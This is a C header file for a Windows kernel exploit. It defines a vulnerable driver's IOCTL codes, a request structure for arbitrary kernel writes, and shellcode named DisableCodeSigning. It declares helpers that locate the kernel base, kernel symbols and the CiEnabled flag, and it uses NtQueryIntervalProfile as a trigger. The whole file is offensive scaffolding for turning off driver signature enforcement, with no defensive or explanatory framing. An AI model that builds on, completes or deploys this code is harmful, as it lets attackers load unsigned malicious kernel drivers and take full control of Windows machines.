#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <Psapi.h>
#pragma comment(lib,"psapi.lib")
#pragma once

#define DCR_IOCTL			        0x00073800
#define DCR_ACTION_ENABLE	        0x00000153
#define DCR_ACTION_TRIGGER	        0x00000017
#define PAYLOAD_SIZE				1024
#define STATUS_INFO_LENGTH_MISMATCH	((NTSTATUS)0xC0000004L)
#define STATUS_SUCCESS              ((NTSTATUS)0x00000000L)

static 
BYTE DisableCodeSigning[] = { 
	0x48, 0xB8, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, // mov     rax, 04141414141414141h
	0x48, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00,					// mov     qword ptr [rax], 0
	0x48, 0x31, 0xC0,											// xor     rax, rax
	0xC3														// retn
    };

typedef struct _IOCTL_REQ {
  DWORD	Action;
  DWORD	Flag;
  ULONG_PTR	TargetAddress;
  CHAR	JUNK_PAD_1[0x08];
  ULONG_PTR	SecondWrite;
  CHAR	JUNK_PAD_2[0x08];
  ULONG_PTR	Buffer;
} IOCTL_REQ, *PIOCTL_REQ;

typedef enum _SYSTEM_INFORMATION_CLASS
{ 
  SystemModuleInformation = 11,
  SystemHandleInformation = 16
} SYSTEM_INFORMATION_CLASS;

typedef enum _KPROFILE_SOURCE {
    ProfileTime,
    ProfileAlignmentFixup,
    ProfileTotalIssues,
    ProfilePipelineDry,
    ProfileLoadInstructions,
    ProfilePipelineFrozen,
    ProfileBranchInstructions,
    ProfileTotalNonissues,
    ProfileDcacheMisses,
    ProfileIcacheMisses,
    ProfileCacheMisses,
    ProfileBranchMispredictions,
    ProfileStoreInstructions,
    ProfileFpInstructions,
    ProfileIntegerInstructions,
    Profile2Issue,
    Profile3Issue,
    Profile4Issue,
    ProfileSpecialInstructions,
    ProfileTotalCycles,
    ProfileIcacheIssues,
    ProfileDcacheAccesses,
    ProfileMemoryBarrierCycles,
    ProfileLoadLinkedIssues,
    ProfileMaximum
} KPROFILE_SOURCE, *PKPROFILE_SOURCE;
 
typedef NTSTATUS (__stdcall *_NtQueryIntervalProfile)(
	IN KPROFILE_SOURCE ProfileSource, 
	OUT PULONG Interval
	);

BOOL
GetDriverImageBase( 
	OUT PULONG_PTR DriverBase, 
	IN PCHAR DriverName
	);

ULONG_PTR
KernelGetProcAddress(
	IN ULONG_PTR UserKernelBase, 
	IN ULONG_PTR RealKernelBase, 
	IN LPCSTR SymName
	);

BOOL
GetKernelBaseInfo(
	OUT PULONG_PTR kernelBase, 
    IN OUT PCHAR kernelImage, 
	IN UINT Size
	);

ULONG_PTR
GetCiEnabledAddress(
	IN HMODULE hModule
	);